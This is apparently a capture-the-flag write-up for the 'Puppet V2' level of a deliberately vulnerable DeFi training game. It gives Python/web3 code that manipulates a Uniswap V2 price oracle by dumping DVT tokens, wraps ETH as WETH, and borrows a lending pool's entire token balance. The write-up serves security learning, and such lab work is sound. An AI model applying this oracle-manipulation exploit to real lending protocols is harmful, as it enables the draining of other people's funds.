## Puppet V2

### Challenge description

> The developers of the last lending pool are saying that they've learned the lesson. And just released a new version!
>
> Now they're using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. That should be enough.
>
> You start with 20 ETH and 10000 DVT tokens in balance. The new lending pool has a million DVT tokens in balance. You know what to do ;)

### Solution

This challenge is *identical* to the puppet challenge, except it uses Uniswap V2. Once again, we can manipulate the price of the token by selling a bunch of DVT tokens for ETH, which reduces the price of DVT tokens relative to ETH so much that it's possible to borrow the entire token balance of the PuppetV2Pool pool.

The only added change here is that Uniswap V2 only performs token to token swaps, where ETH must be wrapped as WETH (an ERC20 token 1:1 with ETH).

The steps to perform the attack are really similar to those of the Puppet challenge:

First we must approve the token spending limit for the Uniswap V2 router:

```py
token.approve(uniswap_router.address, 2**256 - 1, _fromAttacker)
```

Then exchange all the tokens in our wallet for ETH:

```py
uniswap_router.swapExactTokensForETH(
    ether_to_wei(10000), 
    9.92, 
    [token.address, weth.address],
    attacker.address,
    web3.eth.get_block('latest').timestamp * 2,
    _fromAttacker
)
```

`swapTokensForExactTokens()` can also be used, as we're going to use WETH anyway, but we would have to wrap some extra ETH to reach the right amount to drain the pool anyway, so I decided to just use `swapExactTokensForETH()`.

Then obtain what amount of WETH we must deposit to drain the pool:

```py
amount = lending_pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
```

Deposit this same amount into the WETH contract:

```py
weth.deposit(_fromAttacker | value_dict(amount))
```

Now with the WETH in hand we must approve the spending limit of WETH for the PuppetV2Pool contract to the `amount` obtained before (or more):

```py
weth.approve(lending_pool.address, amount, _fromAttacker)
```

Given that the PuppetV2Pool calls `transferFrom()` in `borrow()`:

```solidity
_weth.transferFrom(msg.sender, address(this), depositOfWETHRequired);
```

Then just call borrow to drain the pool:

```py
lending_pool.borrow(POOL_INITIAL_TOKEN_BALANCE, _fromAttacker)
```

And we should receive all the DVT tokens from the pool.
